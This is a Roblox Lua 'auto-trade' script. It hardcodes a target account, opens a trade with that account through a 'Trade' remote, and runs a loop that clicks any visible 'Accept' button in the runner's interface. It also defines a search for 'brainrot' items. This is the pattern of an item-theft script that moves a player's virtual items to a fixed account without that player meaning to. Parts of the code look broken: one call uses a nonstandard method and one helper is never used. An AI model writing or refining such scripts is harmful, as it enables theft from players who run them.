local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TargetPlayerName = "v4lid_taviss"

-- Wait for LocalPlayer to load
if not LocalPlayer then
    Players.PlayerAdded:Wait()
    LocalPlayer = Players.LocalPlayer
end

-- Wait for character to load
if not LocalPlayer.Character then
    LocalPlayer.CharacterAdded:Wait()
end

-- Wait for game to fully load (adjust this if needed)
wait(3)

print("Starting auto-trade script...")

-- Function to find brainrot items
local function findBrainrot(player)
    if not player or not player.Backpack then return nil end
    
    for _, item in pairs(player.Backpack:GetChildren()) do
        if item:IsA("Tool") and item.Name:lower():find("brainrot") then
            return item
        end
    end
    
    if player.Character then
        for _, item in pairs(player.Character:GetChildren()) do
            if item:IsA("Tool") and item.Name:lower():find("brainrot") then
                return item
            end
        end
    end
    return nil
end

-- Function to auto-accept incoming trades
local function autoAcceptTrades()
    print("Listening for trade requests...")
    
    -- Listen for trade GUI popups
    local function checkForTradeUI()
        while true do
            wait(0.1)
            
            -- Look for trade accept button in PlayerGui
            local playerGui = LocalPlayer:WaitForChild("PlayerGui")
            for _, descendant in pairs(playerGui:GetDescendants()) do
                if descendant:IsA("TextButton") and descendant.Text:lower():find("accept") then
                    if descendant.Visible then
                        print("Trade accept button found! Accepting...")
                        descendant:FireEvent("Click1")
                        wait(0.5)
                    end
                end
            end
        end
    end
    
    spawn(checkForTradeUI)
end

-- Function to initiate trade with target player
local function initiateTradeWithTarget()
    local targetPlayer = Players:FindFirstChild(TargetPlayerName)
    if not targetPlayer then
        print("ERROR: Target player '" .. TargetPlayerName .. "' not found!")
        return false
    end
    
    print("Found target player: " .. TargetPlayerName)
    
    -- Look for trade function/remote event in the game
    -- Common locations: ReplicatedStorage, ServerScriptService, or player workspace
    local tradeRemote = nil
    
    -- Try to find trade remote event
    if game:GetService("ReplicatedStorage"):FindFirstChild("Trade") then
        tradeRemote = game:GetService("ReplicatedStorage"):FindFirstChild("Trade")
    end
    
    if tradeRemote then
        print("Found trade remote event, initiating trade...")
        tradeRemote:FireServer(targetPlayer)
        return true
    else
        print("Trade remote not found, trying alternative methods...")
        -- If the game uses a different method, you may need to adjust this
        return false
    end
end

-- Start auto-accepting trades first
autoAcceptTrades()

-- Initiate trade with target player
wait(1)
initiateTradeWithTarget()

print("Auto-trade script running!")
